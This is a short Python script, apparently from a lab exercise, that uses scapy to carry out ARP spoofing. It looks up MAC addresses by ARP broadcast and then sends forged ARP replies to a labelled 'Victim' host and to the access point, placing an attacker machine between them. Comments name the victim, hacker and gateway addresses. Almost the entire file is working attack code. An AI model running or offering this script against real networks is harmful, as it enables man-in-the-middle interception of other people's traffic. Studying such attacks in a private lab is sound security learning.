#! /usr/bin/env python
import scapy.all as scapy


def getMac(ip):
    # scan ip: 10.211.55.3
    # pdst = Net ('10.211.55.1/24')
    arpRequest = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arpRequestBroadcast = broadcast/arpRequest

    # answeredList = scapy.srp(arpRequestBroadcast, timeout=1)[0] ==> [0] is answered
    # answeredList = scapy.srp(arpRequestBroadcast, timeout=1)[1] ==> [1] is unanswered
    # verbose = False ==> remove Begin ...
    answeredList = scapy.srp(arpRequestBroadcast, timeout=1, verbose=False)[0]

    # with element[0] get a default answer 10.211.55.3
    # with element[1] get a list answer 10.211.55.1 and 10.211.55.2
    return (answeredList[0][1].hwsrc)

# AP: 10.211.55.1/ 00:1c:42:00:00:18
# Victim: 10.211.55.4/00:1c:42:83:95:fc
# Hacker: 10.211.55.3/ 00:1c:42:2e:e8:18
# op=1 ==> request
# op=2 ==> response
# target_ip = "10.211.55.4"
# target_mac = "00:1c:42:83:95:fc"
# spoof_ip = "10.211.55.1"


def spoof(target_ip, spoof_ip):
    target_mac = getMac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    print(packet.show())
    print(packet.summary())
    scapy.send(packet)


spoof("10.211.55.4", "10.211.55.1")
spoof("10.211.55.1", "10.211.55.4")
